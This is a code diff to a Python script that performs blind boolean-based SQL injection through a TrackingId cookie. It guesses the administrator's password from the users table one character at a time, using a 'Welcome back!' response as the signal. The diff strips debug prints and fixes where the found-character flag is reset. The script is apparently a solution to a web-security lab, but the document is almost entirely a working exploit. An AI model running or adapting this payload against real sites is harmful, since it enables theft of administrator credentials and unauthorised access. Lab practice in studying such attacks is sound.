@@ -27,25 +27,19 @@ URL = sys.argv[1]
 dic = string.ascii_letters+string.digits
 response = requests.get(URL)
 tracking_id = response.cookies["TrackingId"]
-#print(tracking_id)
 sess_cookie = response.cookies["session"]
-#print(sess_cookie)
 
 def password(url):
-    found_char = False
+    
     pwd = ""
     i = 1
     while(True):
+        found_char = False
         print(f"Index : {i}")
-        #print("Hi")
-        #print(url)
         for d in dic:
-            #print("Hiii")
             payload = tracking_id + "' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), "+str(i)+", 1) = '" +d
-            #print(payload)
             response = requests.get(URL, headers={"Cookie":"TrackingId="+payload+"; session="+sess_cookie})
             if "Welcome back!" in response.text:
-                #print("Hii")
                 pwd += d
                 print(pwd)
                 found_char = True
